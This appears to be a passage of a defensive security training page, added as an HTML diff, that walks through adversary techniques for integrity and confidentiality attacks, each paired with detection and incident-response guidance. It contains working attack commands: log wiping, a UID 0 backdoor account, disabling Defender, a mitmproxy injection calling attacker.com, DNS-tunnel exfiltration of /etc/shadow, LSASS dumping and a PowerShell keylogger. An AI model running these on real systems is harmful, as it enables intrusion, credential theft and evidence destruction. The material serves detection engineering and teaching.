+<h3>Adversarial Examples: Phase 2 — Integrity Violation &amp; Corruption</h3>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Context:</strong> The following examples represent 
+  real-world adversary tradecraft observed in enterprise intrusions. They are 
+  documented here for defensive analysis and detection engineering in authorized 
+  environments only.
+</div>
+
+<h3>Example 2.1: Log Tampering &amp; Anti-Forensics</h3>
+
+<p><strong>Adversary Objective:</strong> Erase evidence of compromise and disrupt forensic timeline reconstruction by selectively deleting log entries, clearing Windows event logs, or altering file timestamps.</p>
+
+<p>After gaining privileged access, an adversary removes indicators of their presence from local logs. On Linux, they use stream editors to purge their source IP or specific command lines from <code>auth.log</code>, <code>syslog</code>, or <code>audit.log</code>. Timestamps are stomped to confuse timeline analysis. On Windows, the Security log is cleared entirely—accepting the generation of Event ID 1102—to destroy the audit trail.</p>
+
+<pre><code><span style="color:#4CAF50;"># Linux: Remove all lines containing the adversary's source IP</span>
+sed -i '/&lt;attacker-ip&gt;/d' /var/log/auth.log
+grep -vE "sshd.*Accepted|sudo.*COMMAND" /var/log/auth.log > /tmp/syslog.tmp && mv /tmp/syslog.tmp /var/log/auth.log
+
+<span style="color:#4CAF50;"># Stomp timestamps to obscure forensic ordering</span>
+touch -t 202501010000 /var/log/syslog
+touch -r /bin/ls /var/log/audit/audit.log
+
+<span style="color:#4CAF50;"># Windows: Clear the Security log (triggers Event ID 1102)</span>
+wevtutil cl Security
+
+<span style="color:#4CAF50;"># Windows: Stop the EventLog service to suppress new events temporarily</span>
+net stop eventlog
+
+<span style="color:#4CAF50;"># Abuse log rotation: force rotation then delete archived logs</span>
+logrotate -f /etc/logrotate.conf
+rm -f /var/log/auth.log.* /var/log/syslog.*</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Log tampering is a post-exploitation priority. 
+  Adversaries avoid wholesale destruction when possible, preferring surgical removal 
+  of specific sessions or IPs to avoid obvious gaps.
+  <strong>Detection opportunities:</strong> Centralized SIEM with immutable 
+  forwarding (syslog/TLS to WORM storage); file integrity monitoring on log files; 
+  Windows Event ID 1102 (Audit Log Cleared); gaps in log sequence numbers; and 
+  filesystem timeline anomalies via MACB analysis.
+</div>
+
+<h3>Example 2.2: Configuration Manipulation &amp; Security Degradation</h3>
+
+<p><strong>Adversary Objective:</strong> Modify system and service configurations to weaken defenses, enable persistent access, or prepare for credential harvesting.</p>
+
+<p>An adversary rewrites SSH daemon settings to permit root login via password, punches firewall holes for command-and-control traffic, and manipulates the Windows registry to disable security features. Enabling the WDigest <code>UseLogonCredential</code> setting forces Windows to store plaintext passwords in LSASS, facilitating future credential extraction.</p>
+
+<pre><code><span style="color:#4CAF50;"># Linux: Enable root login and password auth in SSH</span>
+sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+systemctl restart sshd
+
+<span style="color:#4CAF50;"># Linux: Add iptables rules to allow C2 traffic</span>
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
+
+<span style="color:#4CAF50;"># Windows: Force plaintext credential caching in LSASS</span>
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+<span style="color:#4CAF50;"># Windows: Disable real-time protection (if tamper protection is off)</span>
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+<span style="color:#4CAF50;"># Windows: Registry Run key persistence</span>
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "C:\Windows\Temp\svchost.exe" /f</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Configuration changes are low-noise compared 
+  to dropping binaries. By degrading security controls and enabling weak 
+  authentication, adversaries create hidden footholds and widen the attack surface.
+  <strong>Detection opportunities:</strong> Configuration drift detection via 
+  SCCM, Chef, Puppet, or Ansible; file integrity monitoring on <code>sshd_config</code>; 
+  Windows Event IDs 4657 (Registry Value Modified) and 13 (Sysmon); and EDR 
+  alerts on security-tool tampering.
+</div>
+
+<h3>Example 2.3: Man-in-the-Middle &amp; Content Injection</h3>
+
+<p><strong>Adversary Objective:</strong> Intercept and alter data in transit to harvest credentials, inject malicious content, or downgrade 
+encrypted sessions.</p>
+
+<p>Positioned on the same local subnet, the adversary poisons ARP caches to redirect traffic through their machine. Unencrypted HTTP traffic 
+is modified in real time, swapping benign download links for malicious payloads or injecting JavaScript keyloggers. If the opportunity 
+arises, HTTPS connections are downgraded to plaintext via SSL stripping.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enable IP forwarding to pass traffic while sniffing</span>
+sysctl -w net.ipv4.ip_forward=1
+
+<span style="color:#4CAF50;"># ARP spoofing: position between client and gateway</span>
+arpspoof -i eth0 -t &lt;client-ip&gt; &lt;gateway-ip&gt; &amp;
+arpspoof -i eth0 -t &lt;gateway-ip&gt; &lt;client-ip&gt; &amp;
+
+<span style="color:#4CAF50;"># Mitmproxy: inject arbitrary content into HTTP responses</span>
+cat > /tmp/inject.py &lt;&lt; 'EOF'
+from mitmproxy import http
+
+def response(flow: http.HTTPFlow) -> None:
+    if "text/html" in (flow.response.headers.get("content-type", "")):
+        flow.response.text = flow.response.text.replace(
+            "&lt;title&gt;Corporate Portal&lt;/title&gt;",
+            "&lt;title&gt;Corporate Portal&lt;/title&gt;&lt;script src='http://attacker.com/k.js'&gt;&lt;/script&gt;"
+        )
+EOF
+mitmproxy --mode transparent --showhost -s /tmp/inject.py</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> MITM attacks exploit trust in the network layer. 
+  Adversaries combine ARP poisoning with content injection or SSL stripping to 
+  manipulate data without immediate detection.
+  <strong>Detection opportunities:</strong> Enforce HTTPS with HSTS and 
+  certificate pinning; monitor for gratuitous ARP replies and duplicate MAC/IP 
+  mappings; deploy 802.1X and dynamic ARP inspection (DAI); alert on rapid 
+  SSL/TLS downgrade events.
+</div>
+
+<h3>Example 2.4: File Integrity &amp; Binary Manipulation</h3>
+
+<p><strong>Adversary Objective:</strong> Subvert trust in system utilities and create hidden persistence by manipulating authentication 
+databases and replacing critical binaries.</p>
+
+<p>An adversary creates a backdoor user with UID 0 by appending directly to <code>/etc/passwd</code> and <code>/etc/shadow</code>, then 
+grants passwordless sudo privileges. <br>To evade detection, they replace common system utilities such as <code>ps</code>, <code>netstat</code>, 
+and <code>ls</code> with trojaned versions that filter out attacker processes and files. The immutable attribute (<code>chattr +i</code>) 
+is set to prevent administrators or package managers from restoring the original binaries.</p>
+
+<pre><code><span style="color:#4CAF50;"># Create a UID 0 backdoor account</span>
+echo "sysmaint:x:0:0::/root:/bin/bash" >> /etc/passwd
+openssl passwd -1 -salt 12345678 backdoor
+echo "sysmaint:\$1\$12345678\$abcdefgHIJKLmnoPqrSTU1:0:0:99999:7:::" >> /etc/shadow
+
+<span style="color:#4CAF50;"># Grant passwordless sudo to the adversary-controlled user</span>
+echo "sysmaint ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+<span style="color:#4CAF50;"># Replace system binaries to hide attacker artifacts</span>
+<span style="color:#4CAF50;"># (adversary compiles or copies trojaned ps/netstat/ls that filter specific PIDs/files)</span>
+cp /tmp/trojan_ps /bin/ps
+cp /tmp/trojan_netstat /bin/netstat
+
+<span style="color:#4CAF50;"># Lock trojaned binaries to prevent replacement</span>
+chattr +i /bin/ps
+chattr +i /bin/netstat
+
+<span style="color:#4CAF50;"># Verify immutability</span>
+lsattr /bin/ps /bin/netstat
+<span style="color:#4CAF50;"># Expected: ----i---------e------- /bin/ps</span></code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> File integrity attacks subvert the very tools 
+  defenders use to investigate. By backdooring authentication databases and 
+  trojaning core utilities, adversaries hide in plain sight and complicate 
+  incident response.
+  <strong>Detection opportunities:</strong> File integrity monitoring (AIDE, 
+  Tripwire, OSQuery); alerting on unauthorized <code>/etc/passwd</code> or 
+  <code>/etc/sudoers</code> changes; immutable bit auditing (<code>lsattr</code> 
+  anomalies); and baseline comparison of system binary hashes against known-good 
+  package repositories.
+</div>
+
+<h3>Example 2.5: Blue Team — Defensive Countermeasures</h3>
+
+<p><strong>Objective:</strong> Detect, disrupt, and recover from integrity violations.</p>
+
+<p><strong>Detection Rules &amp; Monitoring</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Initialize file integrity monitoring with AIDE</span>
+aideinit
+aide --check
+
+<span style="color:#4CAF50;"># Audit critical authentication and privilege files</span>
+auditctl -w /etc/passwd -p wa -k identity_management
+auditctl -w /etc/shadow -p wa -k credential_store
+auditctl -w /etc/sudoers -p wa -k privilege_escalation
+auditctl -w /bin/ -p wa -k system_binaries
+
+<span style="color:#4CAF50;"># Review audit logs for unauthorized modifications</span>
+ausearch -k identity_management -ts recent
+ausearch -k system_binaries -ts recent
+
+<span style="color:#4CAF50;"># Detect immutable bit abuse on system binaries</span>
+find /bin /usr/bin /sbin /usr/sbin -exec lsattr {} + | grep '^....i'</code></pre>
+
+<p><strong>Incident Response: Integrity Violation</strong></p>
+
+<div class="iscsec-table-responsive">
+  <table class="iscsec-table" aria-label="Integrity violation incident response">
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Tool / Command</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Detect</strong></td>
+        <td>Identify compromised files, configuration drift, and log gaps</td>
+        <td><code>aide --check</code>, <code>tripwire</code>, <code>osquery</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Contain</strong></td>
+        <td>Isolate affected systems to prevent further tampering</td>
+        <td><code>host isolation</code>, <code>network segmentation</code></td>
+      </tr>
+      <tr>
+        <td><strong>3. Investigate</strong></td>
+        <td>Determine scope: which files, logs, and configs were altered</td>
+        <td><code>forensic timeline</code>, <code>MACB analysis</code></td>
+      </tr>
+      <tr>
+        <td><strong>4. Eradicate</strong></td>
+        <td>Restore known-good binaries and configs from read-only backups</td>
+        <td><code>rpm -Va</code>, <code>debsums -s</code>, <code>reinstall</code></td>
+      </tr>
+      <tr>
+        <td><strong>5. Recover</strong></td>
+        <td>Rebuild integrity baseline and re-establish audit logging</td>
+        <td><code>aideinit</code>, <code>auditctl reload</code></td>
+      </tr>
+      <tr>
+        <td><strong>6. Learn</strong></td>
+        <td>Harden against future tampering with MAC frameworks</td>
+        <td><code>SELinux</code>, <code>AppArmor</code>, <code>Trusted Boot</code></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<p><strong>Additional Defensive Measures</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Enforce HTTPS with HSTS to prevent SSL stripping</span>
+<span style="color:#4CAF50;"># Apache:</span>
+echo "Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"" >> /etc/apache2/conf-available/hsts.conf
+a2enmod headers
+a2enconf hsts
+systemctl reload apache2
+
+<span style="color:#4CAF50;"># Protect critical logs with append-only attribute (if supported)</span>
+chattr +a /var/log/auth.log
+
+<span style="color:#4CAF50;"># Enable Windows Credential Guard to protect LSASS integrity</span>
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
+<span style="color:#4CAF50;"># Reboot required</span></code></pre>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Disclaimer:</strong> These adversarial examples 
+  are derived from real-world attacker tradecraft and are provided for authorized 
+  security testing, detection engineering, and defensive preparedness only.
+</div>
+
+<div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
+  <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+    <strong>Note:</strong> "Integrity is the quiet casualty of most breaches. Attackers don’t just steal data — they change it, hide it, and corrupt it to create confusion, destroy trust, and enable deeper access. Defenders must treat integrity as a strategic asset, not just a technical checkbox."
+  </p>
+</div>
+
+<!-- =========================================== -->
+<!-- PHASE 3                                      -->
+<!-- =========================================== -->
+<h3>Phase 3: Confidentiality Breach &amp; Exposure (The Steal Vector)</h3>
+<p><strong>Adversarial goal:</strong> Extract sensitive information without being detected.</p>
+<ul>
+  <li><strong>Core concept:</strong> Confidentiality.</li>
+  <li><strong>Data exfiltration:</strong> Move data out of the network through DNS tunnels, HTTP POST requests, or cloud sync tools.</li>
+  <li><strong>Eavesdropping:</strong> Sniff unencrypted traffic on local networks or wireless networks.</li>
+  <li><strong>Credential harvesting:</strong> Steal passwords, keys, tokens, or session material from memory, disk, or user input.</li>
+  <li><strong>Key techniques:</strong> Packet capture, DNS tunneling, keylogging, token theft, and memory dumping.</li>
+</ul>
+
+<h3>Adversarial Examples: Phase 3 — Confidentiality Breach &amp; Exposure</h3>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Context:</strong> The following examples represent 
+  real-world adversary tradecraft observed in enterprise intrusions. <br>They are 
+  documented here for defensive analysis and detection engineering in authorized 
+  environments only.
+</div>
+
+<h3>Example 3.1: Data Exfiltration via DNS Tunneling</h3>
+
+<p><strong>Adversary Objective:</strong> Move stolen data out of a restricted network by encapsulating it in DNS queries, bypassing outbound firewall restrictions.</p>
+
+<p>An adversary on a compromised host leverages the fact that DNS traffic is rarely blocked. Tools like <code>dnscat2</code> establish a covert command-and-control channel over TXT and A records, while <code>iodine</code> encapsulates raw IP traffic inside DNS queries and responses. Data is typically encoded as Base64 or hexadecimal within long subdomains.</p>
+
+<pre><code><span style="color:#4CAF50;"># Establish a C2 session via DNS, tunneling command output</span>
+./dnscat2 --dns server=&lt;attacker-domain&gt;,port=53 --secret=&lt;key&gt; --exec "cat /etc/shadow" &lt;attacker-domain&gt;
+
+<span style="color:#4CAF50;"># Create an IP-over-DNS tunnel for bulk exfiltration</span>
+iodine -f -P &lt;tunnel_password&gt; &lt;attacker-ip&gt; &lt;tunnel-domain&gt;
+
+<span style="color:#4CAF50;"># Observe encoded data in DNS query subdomains</span>
+tcpdump -i eth0 -n port 53 -v
+<span style="color:#4CAF50;"># Example capture: A? aGVsbG8gd29ybGQ=.&lt;tunnel-domain&gt;</span></code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> DNS tunneling abuses permitted outbound traffic 
+  to exfiltrate data and maintain C2. Adversaries favor:
+  <ul>
+    <li><strong>dnscat2:</strong> Interactive shell and file transfer over DNS</li>
+    <li><strong>iodine:</strong> Full IP tunneling over DNS</li>
+    <li><strong>Encoding:</strong> Base64, hex, or custom schemes to evade simple DLP</li>
+    <li><strong>Low-and-slow:</strong> Long intervals between queries to avoid volume thresholds</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Monitor for anomalous DNS query volume, 
+  long subdomains (&gt;100 characters), TXT records with encoded payloads, and 
+  DNS traffic directed to non-corporate resolvers.
+</div>
+
+<h3>Example 3.2: Network Eavesdropping &amp; Credential Sniffing</h3>
+
+<p><strong>Adversary Objective:</strong> Harvest credentials and sensitive information by capturing unencrypted network traffic.</p>
+
+<p>An adversary with access to a local subnet passively captures traffic or actively poisons ARP tables to position themselves between a 
+victim and their gateway. Unencrypted protocols—HTTP, FTP, Telnet, SMTP, POP3 transmit credentials and data in plaintext.</p>
+
+<pre><code><span style="color:#4CAF50;"># Passive capture of cleartext protocols</span>
+tcpdump -i eth0 -w capture.pcap tcp port 80 or tcp port 21 or tcp port 23 or tcp port 110
+
+<span style="color:#4CAF50;"># Active ARP spoofing to intercept client-gateway traffic</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t &lt;client-ip&gt; &lt;gateway-ip&gt; &amp;
+arpspoof -i eth0 -t &lt;gateway-ip&gt; &lt;client-ip&gt; &amp;
+
+<span style="color:#4CAF50;"># Extract HTTP POST credentials from a pcap</span>
+tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.request.uri -e data-text-lines
+
+<span style="color:#4CAF50;"># Extract FTP passwords</span>
+tshark -r capture.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Eavesdropping exploits the absence of encryption 
+  to steal data in transit. Adversaries target:
+  <ul>
+    <li><strong>HTTP:</strong> Plaintext credentials in POST requests</li>
+    <li><strong>FTP/Telnet:</strong> Unencrypted command channels and terminal sessions</li>
+    <li><strong>Email (POP3/IMAP/SMTP):</strong> Mailbox credentials and content</li>
+    <li><strong>LLMNR/NBT-NS:</strong> Broadcast name resolution poisoning for hash capture</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Enforce TLS everywhere (HTTPS, SFTP, SSH), 
+  deploy network segmentation, monitor for gratuitous ARP activity, and detect 
+  interfaces entering promiscuous mode.
+</div>
+
+<h3>Example 3.3: LSASS Memory Dumping &amp; Credential Extraction</h3>
+
+<p><strong>Adversary Objective:</strong> Extract passwords, NTLM hashes, and Kerberos tickets from Windows LSASS process memory.</p>
+
+<p>The Local Security Authority Subsystem Service (LSASS) caches credential material for active sessions. An adversary with administrative privileges dumps LSASS memory to disk for offline parsing, or injects a reflectively loaded tool to extract secrets in-place. On modern systems, Protected Process Light (PPL) may block direct access; adversaries may bring vulnerable drivers to disable PPL before dumping.</p>
+
+<pre><code><span style="color:#4CAF50;"># Dump LSASS memory to disk using Sysinternals procdump</span>
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+<span style="color:#4CAF50;"># In-memory credential extraction with Mimikatz</span>
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::tickets /export
+
+<span style="color:#4CAF50;"># Remote extraction via Impacket (requires valid creds or hash)</span>
+netexec smb &lt;target&gt; -u &lt;user&gt; -p &lt;password&gt; --lsa
+secretsdump.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;target&gt;</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> LSASS dumping is the cornerstone of credential 
+  harvesting in Windows environments. Adversaries obtain:
+  <ul>
+    <li><strong>Plaintext passwords:</strong> Via <code>wdigest</code> or <code>kerberos</code> structures (if enabled)</li>
+    <li><strong>NTLM hashes:</strong> For Pass-the-Hash lateral movement</li>
+    <li><strong>Kerberos tickets:</strong> For Pass-the-Ticket and Golden/Silver ticket attacks</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Monitor Event ID 4663/4656 for LSASS 
+  access, Sysmon Event ID 10, and Event ID 1001 (Credential Guard blocked). 
+  Enable Windows Credential Guard to isolate LSASS, and detect known vulnerable 
+  drivers used to bypass PPL.
+</div>
+
+<h3>Example 3.4: Keystroke Capture (Keylogging)</h3>
+
+<p><strong>Adversary Objective:</strong> Record user keystrokes to harvest passwords, secrets, and communications.</p>
+
+<p>Keyloggers may be user-mode applications hooking Windows message queues, PowerShell scripts leveraging native APIs, or Linux input device monitors. The goal is silent, continuous capture of all keyboard input to a file or exfiltration channel.</p>
+
+<pre><code><span style="color:#4CAF50;"># PowerShell keylogger using GetAsyncKeyState (high-order bit check)</span>
+$code = @"
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+public class KeyLogger {
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+    public static void Main() {
+        while(true) {
+            Thread.Sleep(100);
+            for(int i = 32; i &lt; 127; i++) {
+                if((GetAsyncKeyState(i) & 0x8000) != 0) {
+                    Console.Write((char)i);
+                }
+            }
+        }
+    }
+}"@
+Add-Type -TypeDefinition $code
+[KeyLogger]::Main() | Out-File C:\Windows\Temp\syslog.bin -Append
+
+<span style="color:#4CAF50;"># Linux: Capture raw input events</span>
+logkeys -s -o /var/log/.kernel_mod.log
+
+<span style="color:#4CAF50;"># Alternative: Python cross-platform hook (requires pynput/keyboard module)</span>
+python -c "import keyboard; keyboard.on_press(lambda e: open('/tmp/.cache','a').write(e.name+'\n')); keyboard.wait()"</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Keyloggers bypass encryption by capturing data 
+  before it is protected. Adversary techniques include:
+  <ul>
+    <li><strong>PowerShell / .NET hooks:</strong> Living-off-the-land with no binary dropped</li>
+    <li><strong>Linux input device monitoring:</strong> Reading <code>/dev/input/event*</code></li>
+    <li><strong>Hardware implants:</strong> USB or PS/2 inline keyloggers</li>
+  </ul>
+  <strong>Detection opportunities:</strong> EDR alerts on <code>SetWindowsHookEx</code>, 
+  unexpected access to input devices, and PowerShell block logging of suspicious 
+  <code>GetAsyncKeyState</code> usage.
+</div>
+
+<h3>Example 3.5: Session Token Theft &amp; Hijacking</h3>
+
+<p><strong>Adversary Objective:</strong> Steal session identifiers from traffic or browser storage to access protected resources without 
+credentials.</p>
+
+<p>When applications transmit session cookies over unencrypted HTTP or fail to mark cookies as <code>HttpOnly</code>, an adversary 
+positioned on the network can capture and replay them. Tokens may also be extracted from compromised endpoints via browser credential 
+stores or process memory.</p>
+
+<pre><code><span style="color:#4CAF50;"># Capture session cookies from unencrypted HTTP traffic</span>
+tcpdump -i eth0 -A port 80 | grep -i "cookie:"
+
+<span style="color:#4CAF50;"># Reuse a stolen session cookie to access internal data</span>
+curl --cookie "session=&lt;stolen_token&gt;" http://&lt;target&gt;/dashboard
+
+<span style="color:#4CAF50;"># Python automation for API token abuse and data extraction</span>
+import requests
+cookies = {"session": "&lt;stolen_token&gt;"}
+r = requests.get("http://&lt;target&gt;/api/sensitive", cookies=cookies)
+print(r.text)</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Session tokens are cryptographic stand-ins for 
+  identity. If stolen, they grant the adversary the same access as the legitimate 
+  user until expiration or revocation.
+  <strong>Detection opportunities:</strong> Implement Secure, HttpOnly, and 
+  SameSite cookie attributes; enforce HTTPS with HSTS; monitor for token reuse 
+  from abnormal geolocations or user agents; implement short session timeouts.
+</div>
+
+<h3>Example 3.6: Blue Team — Defensive Countermeasures</h3>
+
+<p><strong>Objective:</strong> Detect, disrupt, and recover from confidentiality breaches.</p>
+
+<p><strong>Detection Rules &amp; Monitoring</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Detect potential DNS tunneling: long or high-volume queries to a single domain</span>
+tshark -i eth0 -n -T fields -e dns.qry.name -Y "dns.flags.response == 0" 2>/dev/null | \
+  awk '{print length " " $0}' | sort -rn | head -n 20
+
+<span style="color:#4CAF50;"># Detect large outbound data transfers</span>
+iftop -i eth0 -P
+
+<span style="color:#4CAF50;"># Windows: Monitor for suspicious outbound DNS via Sysmon Event ID 22</span>
+Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath "*[System[(EventID=22)]]" | 
+    Where-Object { $_.Message -notmatch "dns.exe|svchost.exe" }
+
+<span style="color:#4CAF50;"># Detect ARP anomalies / duplicate MAC addresses on the local subnet (Linux)</span>
+cat /proc/net/arp | awk '{print $4}' | sort | uniq -d
+
+<span style="color:#4CAF50;"># Alert on LSASS access (requires Sysmon Event ID 10)</span>
+Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath "*[System[EventID=10]]" |
+    Where-Object { $_.Message -match "TargetImage.*lsass.exe" }
+
+<span style="color:#4CAF50;"># Detect cleartext session cookies transmitted over HTTP</span>
+tshark -i eth0 -Y "http.cookie" -T fields -e http.host -e http.cookie</code></pre>
+
+<p><strong>Incident Response: Confidentiality Breach</strong></p>
+
+<div class="iscsec-table-responsive">
+  <table class="iscsec-table" aria-label="Confidentiality breach incident response">
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Tool / Command</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Detect</strong></td>
+        <td>Identify unauthorized data access and exfiltration channels</td>
+        <td><code>SIEM alerts</code>, <code>DLP</code>, <code>UEBA</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Contain</strong></td>
+        <td>Isolate affected hosts and block exfiltration paths</td>
+        <td><code>network segmentation</code>, <code>firewall rules</code></td>
+      </tr>
+      <tr>
+        <td><strong>3. Investigate</strong></td>
+        <td>Determine scope of data theft and method of extraction</td>
+        <td><code>forensic analysis</code>, <code>log review</code></td>
+      </tr>
+      <tr>
+        <td><strong>4. Eradicate</strong></td>
+        <td>Remove attacker tools and close ingress/egress vectors</td>
+        <td><code>patching</code>, <code>credential rotation</code></td>
+      </tr>
+      <tr>
+        <td><strong>5. Recover</strong></td>
+        <td>Restore services and validate data integrity</td>
+        <td><code>backup restoration</code></td>
+      </tr>
+      <tr>
+        <td><strong>6. Learn</strong></td>
+        <td>Update DLP policies, encryption standards, and monitoring rules</td>
+        <td><code>enhanced monitoring</code>, <code>DLP / exfiltration controls</code></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<p><strong>Additional Defensive Measures</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Encrypt sensitive data at rest using modern key derivation</span>
+<span style="color:#4CAF50;"># WARNING: Never pass plaintext passwords via command-line switches.</span>
+<span style="color:#4CAF50;"># Option A: Interactive passphrase entry (recommended for manual operations)</span>
+openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
+  -in sensitive_data.txt -out sensitive_data.enc
+
+<span style="color:#4CAF50;"># Option B: Read passphrase from a restricted file (automation)</span>
+openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
+  -in sensitive_data.txt -out sensitive_data.enc \
+  -pass file:/etc/ssl/private/enc_passphrase.txt
+
+<span style="color:#4CAF50;"># NOTE: AES-CBC provides confidentiality but not integrity/authentication.</span>
+<span style="color:#4CAF50;"># For authenticated encryption (AEAD) in production, prefer GPG or age.</span>
+
+<span style="color:#4CAF50;"># Enforce HTTPS with HSTS and application-layer cookie hardening</span>
+<span style="color:#4CAF50;"># Apache: Create clean config (overwrite to avoid duplicate directives)</span>
+cat > /etc/apache2/conf-available/hsts.conf &lt;&lt; 'EOF'
+Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
+EOF
+a2enmod headers
+a2enconf hsts
+
+<span style="color:#4CAF50;"># Redirect all HTTP traffic to HTTPS before HSTS is enforced</span>
+<span style="color:#4CAF50;"># RewriteEngine On</span>
+<span style="color:#4CAF50;"># RewriteCond %{HTTPS} off</span>
+<span style="color:#4CAF50;"># RewriteRule ^/?(.*)$ https://%{SERVER_NAME}/$1 [R=301,L]</span>
+
+<span style="color:#4CAF50;"># Cookie hardening: inject Secure, HttpOnly, SameSite=Strict into Set-Cookie headers</span>
+<span style="color:#4CAF50;"># Header always edit Set-Cookie ^(.*)$ $1;Secure;HttpOnly;SameSite=Strict</span>
+systemctl reload apache2
+
+<span style="color:#4CAF50;"># Enable Windows Credential Guard to harden LSASS against dumping</span>
+<span style="color:#4CAF50;"># Prerequisites: UEFI + Secure Boot + TPM 2.0 + HVCI-capable CPU + Win Pro/Ent/Edu</span>
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
+<span style="color:#4CAF50;"># Reboot required. Setting 1 enables Credential Guard with UEFI lock.</span>
+<span style="color:#4CAF50;"># Verify after reboot with: msinfo32 -> System Summary -> Device Guard</span>
+
+<span style="color:#4CAF50;"># Block DNS exfiltration to unauthorized resolvers (Linux netfilter example)</span>
+<span style="color:#4CAF50;"># Replace 10.0.0.1 with your authorized internal DNS resolver IP</span>
+iptables -A OUTPUT -p udp --dport 53 ! -d 10.0.0.1 -j LOG --log-prefix "DNS_TUNNEL "
+iptables -A OUTPUT -p udp --dport 53 ! -d 10.0.0.1 -j DROP
+iptables -A OUTPUT -p tcp --dport 53 ! -d 10.0.0.1 -j DROP
+
+<span style="color:#4CAF50;"># Harden Linux endpoints against input device keyloggers</span>
+<span style="color:#4CAF50;"># Restrict /dev/input/event* to the input group (verify GUI/Xorg still starts)</span>
+chmod 640 /dev/input/event*
+chgrp input /dev/input/event*
+
+<span style="color:#4CAF50;"># Windows: Add privileged users to "Protected Users" group to prevent credential caching</span>
+<span style="color:#4CAF50;"># and deploy WDAC/AppLocker to restrict unapproved binaries and hooking DLLs.</span></code></pre>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Disclaimer:</strong> These adversarial examples 
+  are derived from real-world attacker tradecraft and are provided for authorized 
+  security testing, detection engineering, and defensive preparedness only.
+</div>
+
+<div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
+  <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+    "Confidentiality is the crown jewel of information security. Attackers don’t just want to disrupt operations — they want to steal what matters most. Defenders must treat every piece of sensitive data as if it's already being targeted."
+  </p>
+</div>
+	  
+<!-- =========================================== -->
+<!-- PHASE 4                                      -->
+<!-- =========================================== -->
+
+<h3>Phase 4: Authentication Bypass &amp; Identity Theft (The Entry Vector)</h3>
+<p><strong>Adversarial goal:</strong> Prove an identity, even when the attacker does not own it.</p>
+<ul>
+  <li><strong>Core concept:</strong> Authentication.</li>
+  <li><strong>Credential stuffing and brute force:</strong> Try known, leaked, or guessed passwords against login portals.</li>
+  <li><strong>Session hijacking:</strong> Steal a valid session cookie or token to impersonate an active user.</li>
